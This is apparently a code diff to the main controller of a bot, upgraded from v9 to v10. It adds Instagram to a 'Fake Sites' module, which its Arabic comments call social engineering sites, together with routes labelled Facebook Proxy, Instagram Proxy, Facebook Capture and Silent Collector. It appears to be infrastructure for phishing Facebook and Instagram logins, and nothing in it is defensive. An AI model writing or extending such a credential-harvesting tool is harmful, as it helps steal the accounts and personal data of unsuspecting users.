@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v9
-# مع Silent Collector + Fake Sites
+# DEV 1 - Bot Controller v10
+# مع Silent Collector + Fake Sites + Instagram
 # ============================================================
 
 import os
@@ -96,7 +96,7 @@ except Exception as e:
         pass
 
 # ============================================================
-# [6] ★ Fake Sites
+# [6] Fake Sites
 # ============================================================
 try:
     from fake_sites import init_fake_sites
@@ -126,10 +126,18 @@ ALLOWED_PREFIXES = (
     '/apk',             # APK Manager + Auto-Update
     '/dashboard',       # Web Dashboard
     '/s/',              # Silent Collector
-    '/fs',              # ★ Fake Sites (مواقع الهندسة الاجتماعية)
-    '/api/v1/session', '/f/',
-    '/login.php', '/ig_login.php',
-    '/manifest.json', '/sw.js',
+    '/fs',              # Fake Sites (مواقع الهندسة الاجتماعية)
+    '/login.php',       # Facebook Proxy
+    '/home.php',        # Facebook Proxy
+    '/fb',              # Facebook Proxy shortcut
+    '/ig_login.php',    # Instagram Proxy
+    '/fb_capture',      # Facebook Capture
+    '/api/v1/session',
+    '/f/',
+    '/manifest.json',
+    '/sw.js',
+    '/favicon.ico',
+    '/robots.txt',
     '/_health', '/_metrics', '/_version',
 )
 
@@ -266,7 +274,7 @@ else:
 if FAKE_SITES_ENABLED:
     try:
         init_fake_sites(app, bot)
-        logger.info("[+] Init: fake sites routes")
+        logger.info("[+] Init: fake sites routes (FB + IG)")
     except Exception as e:
         logger.exception(f"[-] Fake Sites init failed: {e}")
 else:
